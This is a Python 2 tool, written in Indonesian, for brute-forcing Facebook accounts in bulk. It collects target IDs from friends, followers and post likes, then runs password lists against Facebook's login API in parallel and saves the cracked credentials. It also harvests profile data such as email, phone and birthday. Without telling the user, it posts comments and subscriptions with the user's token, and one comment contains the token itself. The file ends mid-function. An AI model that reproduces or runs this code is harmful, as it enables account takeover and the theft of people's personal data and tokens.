#!/usr/bin/python2
# coding=utf-8
# code by ROY
# my facebook ( https://www.facebook.com/JbFbOld )
# no recode
import os
try:
    import requests
except ImportError:
    print '\n [x] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [x] Modul Futures belum terinstall!...\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [x] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Roy Octa Firdaus  #
#------------------------------->
ok = []
cp = []
id = []
user = []
loop = 0
tt = []
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Menghapus Token FB %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LOGO
logo = '''%s ╦═╗╔═╗╦ ╦   ╦═╗╔╦╗╔╗ ╔═╗
 %s╠╦╝║ ║╚╦╝───╠╦╝║║║╠╩╗╠╣ 
 %s╩╚═╚═╝ ╩    ╩╚═╩ ╩╚═╝╚  %s
%s %s==================================================%s
 [ \x1b[47;30;1m ROY MULTI BRUTE FACEBOOK%s ]'''%(M,K,H,M,N,N,N,N)
# crack selesai
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n [%s✓%s] Total OK : %s%s%s'%(H,N,H,str(len(ok)),N)
		print ' [%s✓%s] Total CP : %s%s%s'%(K,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n [%s!%s] Maaf kamu tidak mendapatkan hasil Crack :('%(M,N)
		exit()
# Token FB bukan token PLN
def yayanxd():
	os.system('clear')
	print (' %s*%s Tools ini menggunakan login token FB.\n %s*%s Apakah kamu sudah tau cara mendapatkan Token FB?\n %s*%s Ketik %sopen%s untuk mendapatkan Token FB.'%(O,N,O,N,O,N,H,N))
	__cindy__ = raw_input('\n %s[%s?%s] Masukkan Token FB :%s '%(N,M,N,H))
	if __cindy__ in ('open', 'Open', 'OPEN'):
		print '\n%s *%s NOTE! Usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s Jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s Setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s Lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' [%s ENTER%s ] '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__yayan__.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print '\n\n %s*%s Selamat datang %s%s%s'%(O,N,K,nama,N)
		time.sleep(2)
		print ' %s*%s Mohon untuk menggunakan SC ini sewajarnya, kami tidak bertanggung jawab jika SC ini disalah gunakan...'%(O,N)
		time.sleep(2)
		raw_input(' [%s ENTER%s ] '%(O,N))
		os.system('xdg-open https://api.whatsapp.com/send?phone=6281318306972-mg')
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s] Token Invalid'%(N,M,N)
		time.sleep(2)
		yayanxd()
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __cindy__=open('__yayan__.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] Tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print ' %s[%s*%s] Author   : %sRoy Octa Firdaus'%(N,H,N,K,)
    print ' %s[%s*%s] Facebook : %sfacebook.com/JbFbOld'%(N,H,N,K)
    print ' %s[%s*%s] Whatsapp : %s081318306972'%(N,H,N,K)
    print ' %s=================================================='%(N)
    print ' %s[%s*%s] Nama FB : %s%s%s'%(N,K,N,K,nama,N)
    print ' %s[%s*%s] ID FB   : %s%s%s'%(N,K,N,K,idfb,N)
    print ' %s[%s*%s] IP Anda : %s%s'%(N,K,N,K,IP)
    print ' %s=================================================='%(N)
    print ' [%s?%s] %sMENU PILIHAN'%(K,N,O)
    print ' %s[%s1%s] Crack dari Daftar Teman'%(N,H,N)
    print ' [%s2%s] Crack dari Teman Publik'%(H,N)
    print ' [%s3%s] Crack dari Total Followers'%(H,N)
    print ' [%s4%s] Crack dari Like Postingan'%(H,N)
    print ' [%s5%s] %sMulai Crack'%(H,N,H)
    print ' %s[%s6%s] Cek Informasi Akun FB'%(N,H,N)
    print ' [%s7%s] Cek Hasil Crack'%(H,N)
    print ' [%s8%s] Info %sSC ROY'%(H,N,H)
    print ' %s[%s0%s] Logout (%sHapus Token%s)'%(N,M,N,M,N)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [%s?%s] Pilih Menu : '%(K,N))
        if yan == '':
           print '\n %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali menu pilihan Anda!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
        elif yan =='1':
                teman()
        elif yan =='2':
                publik()
        elif yan =='3':
                followers()
        elif yan =='4':
                postingan()
        elif yan =='5':
                __crack__().slurr()
        elif yan =='6':
        	jalan('\n NOTE! Ketik %suser%s jika anda ingin mendapatkan ID dari username'%(H,N));time.sleep(0.07)
        	cek_ingfo()
        elif yan =='7':
            print("\n \033[0;97m[\033[0;96m1\033[0;97m] Check hasil OK")
            print(" \033[0;97m[\033[0;96m2\033[0;97m] Check hasil CP")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Choose : ")
            if ask =="":
                moch_yayan()
            elif ask == "1" or ask == "01":
                try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil OK :(")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033[0;97m[\033[0;93m#\033[0;97m] ==================================================")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil CP :(")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
        elif yan =='8':
        	info_tools()
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __yayan__.txt')
                jalan ('\n %s[%s✓%s]%s Berhasil menghapus Token FB'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s!%s] Pilihan Menu [%s%s%s] tidak ada, cek kembali pilihan menu Anda!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__cindy__ = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%sx%s] Token invalid'%(N,M,N)
		os.system('rm -rf __yayan__.txt')
	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'best seller'])
	xi_jimpinx = '1379112335803650'
	goceng  = '1303409076707310'
	requests.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__cindy__,__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
	#exit('\n %s[%s×%s] Jalankan ulang perintah nya'%(N,M,N))
	moch_yayan()
# dump id dari teman hehe
def teman():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n [%s?%s] Nama File  : '%(K,N))
        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari teman'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,cin,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(cin)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [%s?%s] ID Publik  : '%(K,N)) 
        ahh = raw_input(' [%s?%s] Nama File  : '%(K,N))
        ihh = raw_input(' [%s?%s] Total ID   : '%(K,N))
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
        id = []
        z = json.loads(xxx.text)
        kntl = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(kntl, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari teman publik'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,kntl,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(kntl)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [%s?%s] ID Follow  : '%(K,N))
        mmk = raw_input(' [%s?%s] Nama File  : '%(K,N))
        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari total followers'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,ah,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ah)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari postingan hehe
def postingan():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [%s?%s] ID Posting : '%(K,N))
        ppk = raw_input(' [%s?%s] Nama File  : '%(K,N))
        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
        kon = requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari like postingan'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,ikeh,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ikeh)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# cek info
def cek_ingfo():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except (KeyError, IOError):
        print '\n %s[%s!%s] Token/Cookies Invalid'%(P,M,P)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        ppk = raw_input('\n [%s?%s] Masukkan ID FB : '%(K,N))
        if ppk in ('user', 'User', 'USER'):
        	jalan('\n [%s!%s] Anda akan di arahkan ke browser!'%(M,N));time.sleep(2)
        	os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
        	cek_ingfo()
        aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(ppk, __cindy__))
        x = json.loads(aww.text)
        nmaa = x['name']
    except (KeyError, IOError):
    	nmaa = '%s-%s'%(M,N)
    except: pass
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    except: pass
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    except: pass
    try:
    	user = x['username']
    except (KeyError, IOError):
    	user = '%s-%s'%(M,N)
    except: pass
    try:
    	ttll = x['birthday']
    except (KeyError, IOError):
    	ttll = '%s-%s'%(M,N)
    except: pass
    try:
    	gndr = x['gender']
    except (KeyError, IOError):
    	gndr = '%s-%s'%(M,N)
    except: pass
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%sJones%s'%(M,N)
    except: pass
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    except: pass
    try:
    	uptd = x['updated_time']
    except (KeyError, IOError):
    	uptd = '%s-%s'%(M,N)
    except: pass
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    except: pass
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    except: pass
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(ppk, __cindy__))
        z = json.loads(r.text)
        for i in z['data']:
        	id.append(i['id'])
    except: pass
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(ppk, __cindy__))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print '\n  * Informasi Akun Facebook *';time.sleep(0.03)
    print '\n [*] Nama Lengkap : %s'%(nmaa);time.sleep(0.03)
    print ' [*] Nama Depan   : %s'%(ndpn);time.sleep(0.03)
    print ' [*] Nama Belakang : %s'%(nmbl);time.sleep(0.03)
    print ' [*] Username FB  : %s'%(user);time.sleep(0.03)
    print '\n  * Data-data akun facebook *\n';time.sleep(0.03)
    print ' [*] Gmail Facebook : %s'%(emai);time.sleep(0.03)
    print ' [*] Nomor Telepon  : %s'%(nmrr);time.sleep(0.03)
    print ' [*] Tanggal Lahir  : %s'%(ttll);time.sleep(0.03)
    print ' [*] Kenis Kelamin  : %s'%(gndr);time.sleep(0.03)
    print ' [*] Jumlah Teman  : %s'%str(len(id));time.sleep(0.03)
    print ' [*] Total Followers : %s'%(pengikut);time.sleep(0.03)
    print ' [*] Link Facebook  : %s'%(lins);time.sleep(0.03)
    print ' [*] Status Hubungan : %s %s'%(stas,dgn);time.sleep(0.03)
    print ' [*] Tentang Status : %s'%(bioo);time.sleep(0.03)
    print ' [*] Kota Asal      : %s'%(dari);time.sleep(0.03)
    print ' [*] Tinggal di     :‰ %s'%(tigl);time.sleep(0.03)
    print ' [*] Zona waktu     : %s'%(tzim);time.sleep(0.03)
    print ' [*] Terakhir FB di update : %s'%(uptd);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m'
    jalan('\n [%s✓%s] Berhasil mengechek data akun Facebook\n\n'%(O,N));time.sleep(0.03)
    exit()
# cek info sc
def info_tools():
    os.system('clear')
    print '%s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
    print '%s[%s✓%s] Author	: %sRoy Octa Firdaus'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Github	: %sPrivate'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Whatsapp	: %s+6281318306972'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Facebook	: %sfacebook.com/jbfbold'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Fanspage	: %sfacebook.com/infoappdangame'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Website	: %swww.royjbfbold.my.id'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s#%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
    raw_input('[%s KEMBALI%s ]'%(O,N))
    moch_yayan()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def slurr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Masukkan Nama File : '%(K,N))
            self.id = open(self.apk).read().splitlines()
            print ' [%s*%s] Menghitung Total ID : %s%s%s' %(H,N,M,len(self.id),N)
        except:
            print '\n %s[%s!%s] File [%s%s%s] tidak ada, Silahkan dump ID terlebih dahulu!'%(N,M,N,M,self.apk,P)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s] Ingin menggunakan kata sandi manual? [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n [%s?%s] Contoh: [ %ssayang,sayang123,roy123%s ]'%(K,N,H,N)
            while True:
                pwek = raw_input('\n [%s?%s] Sandi Manual : '%(K,N))
                print ' [%s?%s] Crack dengan Sandi Manual : [ %s%s%s ]' % (K,N,M, pwek, N)
                if pwek == '':
                    self.slurr()
                else:
                	
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [%s?%s] Pilihan Method : '%(K,N))
                        if cin == '':
                            self.__yan__()
                        elif cin == '1':
                            print '\n [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H, N, ha, op, ta)
                            print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K, N, ha, op, ta)
                            print '\n [%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '2':
                            print '\n [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H, N, ha, op, ta)
                            print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K, N, ha, op, ta)
                            print '\n [%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '3':
                            print '\n [%s✓%s] Hasil OK ke : results/OK-%s-%s-%s.txt' % (H, N, ha, op, ta)
                            print ' [%s✓%s] Hasil CP ke : results/CP-%s-%s-%s.txt' % (K, N, ha, op, ta)
                            print '\n [%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n %s[%s✓%s] Proses Crack by ROY Selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] Isi dengan bener!'%(N,M,N)
                            time.sleep(2)
                            moch_yayan()
                    print ' %s=================================================='%(N)
                    print ' %s[%s?%s] Pilih Method login Anda. Silahkan coba satu²'%(N,K,N)
                    print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat%s)'%(N,H,N,O,N,M,N)
                    print ' %s[%s2%s] Method %smbasic %s(%sProses Slow%s)'%(N,H,N,O,N,K,N)
                    print ' %s[%s3%s] Method %smobile %s(%sProses Sangat Slow%s)'%(N,H,N,O,N,H,N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print ' %s=================================================='%(N)
            print ' %s[%s?%s] Pilih Method login Anda. Silahkan coba satu²'%(N,K,N)
            print ' %s[%s1%s] Method %sb-api %s(%sProses Cepat%s)'%(N,H,N,O,N,M,N)
            print ' %s[%s2%s] Method %smbasic %s(%sProses Slow%s)'%(N,H,N,O,N,K,N)
            print ' %s[%s3%s] Method %smobile %s(%sProses Sangat Slow%s)'%(N,H,N,O,N,H,N)
            self.__pler__()
        else:
            print '\n %s[%sx%s] y/t !'%(N,M,N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
    	global ok,cp,loop,tt
        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK:%s - CP:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            user_agent = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params, headers=headers_)
            if re.search('(EAAA)\\w+', response.text):
                print '\r %sID: %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    tt = az['birthday']
                except (KeyError, IOError):
                    tt = ' '
                except: pass
                print '\r %sID: %s|%s %s     %s' % (K,user,pw,tt,N)
                wrt = ' [✓] %s|%s %s' % (user,pw,tt)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
              continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global ok,cp,loop,tt
        print '\r [\x1b[1;96m*\x1b[0m] Crack : %s/%s OK-:%s | CP-:%s '%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
